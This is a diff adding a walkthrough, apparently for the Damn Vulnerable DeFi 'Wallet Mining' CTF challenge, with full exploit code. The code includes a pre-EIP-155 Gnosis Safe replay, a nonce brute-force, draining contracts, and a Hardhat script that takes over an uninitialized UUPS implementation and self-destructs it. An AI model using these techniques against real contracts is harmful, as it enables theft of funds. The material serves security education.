@@ -349,6 +349,235 @@ It's also important to note that the challenge's code utilizes [Hardhat UUPS Upg
 
 ### 13. Wallet Mining
 
+This is a challenging task that involves two key areas of knowledge. The first part demands an understanding of cross-chain replay attacks, similar to what happened in the [Optimism Hack in 2022](https://mirror.xyz/0xbuidlerdao.eth/lOE5VN-BHI0olGOXe27F0auviIuoSlnou_9t3XRJseY). The second part requires in-depth knowledge of the UUPS upgradeable pattern, particularly the distinction between proxy and implementation contracts, along with some grasp of Yul assembly language.
+
+Let's tackle each challenge step by step:
+
+#### 1. Draining `DEPOSIT_ADDRESS`
+
+We start by aiming to drain the 20 million DVT tokens in `DEPOSIT_ADDRESS`. In the context of the challenge, it's identified as a Gnosis Safe proxy wallet. However, since we are operating on a local hardhat chain, this wallet, along with the Gnosis Safe master contract and proxy factory, hasn't been deployed. Our objective is to replicate a replay attack and transfer the Gnosis Safe deployment from the Ethereum mainnet to our local hardhat chain.
+
+By examining etherscan, we can locate the deployment transactions for Gnosis Safe’s MasterCopy and ProxyFactory:
+- https://etherscan.io/tx/0x75a42f240d229518979199f56cd7c82e4fc1f1a20ad9a4864c635354b4a34261
+- https://etherscan.io/tx/0x06d2fa464546e99d2147e1fc997ddb624cec9c8c5e25a050cc381ee8a384eed3
+
+Notably, the deployer address `0x1aa7451dd11b8cb16ac089ed7fe05efa00100a6a` is consistent across these deployments, and these represent the first and third transactions of the deployer.
+
+To conduct a replay attack on our local chain, we can retrieve the raw transaction data from Etherscan. It's crucial to replay all transactions (1-3) as the blockchain tracks a user’s nonce value.
+
+Having deployed the Gnosis Safe ProxyFactory on our local chain, we must next determine how it deployed the `DEPOSIT_ADDRESS`. By analyzing the contract code (available publicly on Etherscan), we find two methods for creating a proxy contract: `CREATE` and `CREATE2`. However, a reasonable assumption is that `CREATE` was used (since guessing the random salt for `CREATE2` would be impractical). Attempting to brute-force the nonce value for `CREATE` to match `DEPOSIT_ADDRESS`, we discover success on the 43rd attempt.
+
+[Gnosis Safe Proxy Factory Code](https://etherscan.io/address/0x76e2cfc1f5fa8f6a5b3fc4c8f4788f0116861f9b#code)
+```
+    /// @dev Allows to create new proxy contact and execute a message call to the new proxy within one transaction.
+    /// @param masterCopy Address of master copy.
+    /// @param data Payload for message call sent to new proxy contract.
+    function createProxy(address masterCopy, bytes memory data)
+        public
+        returns (Proxy proxy)
+    {
+        proxy = new Proxy(masterCopy);
+        if (data.length > 0)
+            // solium-disable-next-line security/no-inline-assembly
+            assembly {
+                if eq(call(gas, proxy, 0, add(data, 0x20), mload(data), 0, 0), 0) { revert(0, 0) }
+            }
+        emit ProxyCreation(proxy);
+    }
+    /// ...
+    /// @dev Allows to create new proxy contact using CREATE2 but it doesn't run the initializer.
+    ///      This method is only meant as an utility to be called from other methods
+    /// @param _mastercopy Address of master copy.
+    /// @param initializer Payload for message call sent to new proxy contract.
+    /// @param saltNonce Nonce that will be used to generate the salt to calculate the address of the new proxy contract.
+    function deployProxyWithNonce(address _mastercopy, bytes memory initializer, uint256 saltNonce)
+        internal
+        returns (Proxy proxy)
+    {
+        // If the initializer changes the proxy address should change too. Hashing the initializer data is cheaper than just concatinating it
+        bytes32 salt = keccak256(abi.encodePacked(keccak256(initializer), saltNonce));
+        bytes memory deploymentData = abi.encodePacked(type(Proxy).creationCode, uint256(_mastercopy));
+        // solium-disable-next-line security/no-inline-assembly
+        assembly {
+            proxy := create2(0x0, add(0x20, deploymentData), mload(deploymentData), salt)
+        }
+        require(address(proxy) != address(0), "Create2 call failed");
+    }
+```
+
+In conclusion, the final step involves deploying 42 dummy proxies. On the 43rd attempt, we deploy our attack wallet, which then enables us to successfully drain the 20 million tokens.
+
+Attack Wallet code:
+```sol
+contract MockWallet {
+    function attack(address _token, address _player) public {
+        DamnValuableToken(_token).transfer(_player, 20000000 ether);
+    }
+}
+```
+
+It's important to also note that cross-chain replay attacks of this nature are only feasible for transactions that occurred before the implementation of EIP-155. EIP-155 introduced the use of the chain ID as part of the transaction signing process, which serves as a safeguard against transaction replay attacks.
+
+#### 2. Draining `WalletDeployer`
+
+
+Notice that the `WalletDeployer` uses `AuthorizerUpgradeable` to verify if it can execute the drop() function, which sends 1 ether to the sender. The `AuthorizerUpgradeable` contract employs the UUPS Upgradeable pattern, but there contains a vulnerability.
+
+The UUPS Upgradeable pattern involves two components: a proxy contract and an implementation contract. The proxy is designed to pass all calls (using `delegatecall`) to the implementation contract, with all data storage maintained in the proxy contract. The vulnerability arises because the implementation contract doesn't disable initialization in its constructor. As a result, it remains uninitialized, allowing anyone to claim ownership by calling the init function. (Note: You might wonder why the UUPS Upgradeable pattern doesn't force disabling initializer in constructors. I raised this question on OpenZeppelin's forum but didn't receive a response. So, I sought an answer from ChatGPT. For more details, see [this thread](https://forum.openzeppelin.com/t/can-disableinitializers-in-constructors-made-mandatory-for-uupsupgradeable-contracts/38927/2).)
+
+[OpenZeppelin's Initializable.sol](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/proxy/utils/Initializable.sol#L39-L55)
+
+```sol
+ * [CAUTION]
+ * ====
+ * Avoid leaving a contract uninitialized.
+ *
+ * An uninitialized contract can be taken over by an attacker. This applies to both a proxy and its implementation
+ * contract, which may impact the proxy. To prevent the implementation contract from being used, you should invoke
+ * the {_disableInitializers} function in the constructor to automatically lock it when it is deployed:
+ *
+ * [.hljs-theme-light.nopadding]
+ * ```
+ * /// @custom:oz-upgrades-unsafe-allow constructor
+ * constructor() {
+ *     _disableInitializers();
+ * }
+ * ```
+ * ====
+```
+
+Additionally, the implementation contract permits external calls to execute `upgradeToAndCall()` without verifying if it's being called within a proxy context. This means that once we've taken ownership, we can use it to execute a `delegatecall` as the implementation contract. The proper approach would involve implementing a proxy check, similar to what is done in OpenZeppelin's `UUPSUpgradeable.sol` contract.
+
+[OpenZeppelin UUPSUpgradeable.sol](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/proxy/utils/UUPSUpgradeable.sol#L86-L89)
+```sol
+    /**
+     * @dev Upgrade the implementation of the proxy to `newImplementation`, and subsequently execute the function call
+     * encoded in `data`.
+     *
+     * Calls {_authorizeUpgrade}.
+     *
+     * Emits an {Upgraded} event.
+     *
+     * @custom:oz-upgrades-unsafe-allow-reachable delegatecall
+     */
+    function upgradeToAndCall(address newImplementation, bytes memory data) public payable virtual onlyProxy {
+        _authorizeUpgrade(newImplementation);
+        _upgradeToAndCallUUPS(newImplementation, data);
+    }
+```
+
+Finally, let's examine the can() function used by WalletDeployer to validate addresses. This function checks whether staticcall() returns true. However, staticcall() can return true even if the address doesn't contain any code. Therefore, we can simply self-destruct the implementation contract to bypass this check. For more information on how this works, refer to the [Solidity docs](https://docs.soliditylang.org/en/v0.8.23/control-structures.html#error-handling-assert-require-revert-and-exceptions)
+
+```sol
+    // TODO(0xth3g450pt1m1z0r) put some comments
+    function can(address u, address a) public view returns (bool) {
+        assembly { 
+            let m := sload(0)
+            if iszero(extcodesize(m)) {return(0, 0)}
+            let p := mload(0x40)
+            mstore(0x40,add(p,0x44))
+            mstore(p,shl(0xe0,0x4538c4eb))
+            mstore(add(p,0x04),u)
+            mstore(add(p,0x24),a)
+            if iszero(staticcall(gas(),m,p,0x44,p,0x20)) {return(0,0)}
+            if and(not(iszero(returndatasize())), iszero(mload(p))) {return(0,0)}
+        }
+        return true;
+    }
+```
+
+Contract code for self-destructing the UUPS implementation contract.
+```sol
+contract FakeAuthorizer is UUPSUpgradeable {
+
+    function attack() public {
+        selfdestruct(payable(address(0)));
+    }
+
+    function _authorizeUpgrade(address imp) internal override {}
+}
+```
+
+#### 3. Wrap it up
+```js
+    it('Execution', async function () {
+        // First, find the deployer who deployed the ProxyFactory and MasterCopy (do this on etherscan) - `0x1aa7451dd11b8cb16ac089ed7fe05efa00100a6a`.
+        // - https://etherscan.io/tx/0x75a42f240d229518979199f56cd7c82e4fc1f1a20ad9a4864c635354b4a34261
+        // - https://etherscan.io/tx/0x06d2fa464546e99d2147e1fc997ddb624cec9c8c5e25a050cc381ee8a384eed3
+
+        // Then, we can find the deployment of MasterCopy and ProxyFactory is the 1st and 3rd transaction of the deployer.
+        // - https://etherscan.io/txs?a=0x1aa7451dd11b8cb16ac089ed7fe05efa00100a6a
+
+        // Finally, since the transactions are done BEFORE EIP-155, it does not contain chainId information in the transaction data, which means we can perform
+        // a replay attack on our local chain.
+        const deployer = `0x1aa7451DD11b8cb16AC089ED7fE05eFa00100A6A`;
+        await player.sendTransaction({
+          from: player.address,
+          to: deployer,
+          value: ethers.utils.parseEther("1"),
+        });
+
+        // Mock the first 2 transactions of deployer, and deploy the `GnosisSafeProxyFactory` which should have the address of `0x76E2cFc1F5Fa8F6a5b3fC4c8F4788F0116861F9B`.
+        await ethers.provider.sendTransaction(firstTx);
+        await ethers.provider.sendTransaction(secondTx);
+        const txReceipt = await (await ethers.provider.sendTransaction(createFactoryTx)).wait();
+        const proxyFactory = (await ethers.getContractFactory("GnosisSafeProxyFactory")).attach(txReceipt.contractAddress);
+        expect(txReceipt.contractAddress).to.be.equal(`0x76E2cFc1F5Fa8F6a5b3fC4c8F4788F0116861F9B`);
+
+        // Calculate the nonce of the deployment of `GnosisSafeProxyFactory`. Since it uses `create`, we can bruteforce the nonce.
+        // nonce == 43.
+        // for (let i = 1; i < 50; i++) {
+        //   const addr = ethers.utils.getContractAddress({
+        //   from: "0x76E2cFc1F5Fa8F6a5b3fC4c8F4788F0116861F9B",
+        //   nonce: i,
+        // });
+        // if (addr == "0x9B6fb606A9f5789444c17768c6dFCF2f83563801") {
+        //   console.log("Deposit deployment nonce", i);
+        // }
+        // }
+
+        // Deploy mockWallet to drain funds from `DEPOSIT_ADDRESS`.
+        const mockWalletFactory = await ethers.getContractFactory("MockWallet");
+        const mockWallet = await mockWalletFactory.deploy();
+        for (let i = 1; i <= 42; i++) {
+            await proxyFactory.createProxy(mockWallet.address, []);
+        }
+        const payload = mockWalletFactory.interface.encodeFunctionData("attack", [
+            token.address,
+            player.address,
+        ]);
+        await proxyFactory.createProxy(mockWallet.address, payload);
+
+        // We can to upgrade the `AuthorizerUpgradeable` to bypass the `can()` check. This is because the contract does not run `_disableInitializers()`
+        // in its constructor, so we can directly take control of its ownership by calling its `init()` function.
+        // UUPSUpgradable Implementation Slot: 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc
+        const implementationSlot = await ethers.provider.getStorageAt(authorizer.address, '0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc');
+        const implementationAddr = `0x` + implementationSlot.slice(-40);
+
+        // Connect `AuthorizerUpgradeable` to be its owner.
+        const authorizerUpgradeable = (await ethers.getContractFactory("AuthorizerUpgradeable")).attach(implementationAddr);
+        await authorizerUpgradeable.connect(player).init([], []);
+
+        // Deploy `FakeAuthorizer` for upgrade.
+        const fakeAuthorizerFactory = (await ethers.getContractFactory("FakeAuthorizer"));
+        const fakeAuthorizer = await fakeAuthorizerFactory.deploy();
+
+        // Upgrade the `AuthorizerUpgradeable`'s logic contract to our `FakeAuthorizer`.
+        await authorizerUpgradeable
+          .connect(player)
+          .upgradeToAndCall(fakeAuthorizer.address, fakeAuthorizerFactory.interface.encodeFunctionData("attack", []));
+
+        // The `can()` function on `walletDeployer` should be true by now.
+        expect(await walletDeployer.can(player.address,DEPOSIT_ADDRESS)).to.be.true;
+
+        // Run `drop()` 43 times to drain all of `walletDeployer` tokens.
+        for (let i = 0; i < 43; i++) {
+            await walletDeployer.connect(player).drop([]);
+        }
+
+    });
+```
+
 ### 14. Puppet V3
 
 ### 15. ABI Smuggling
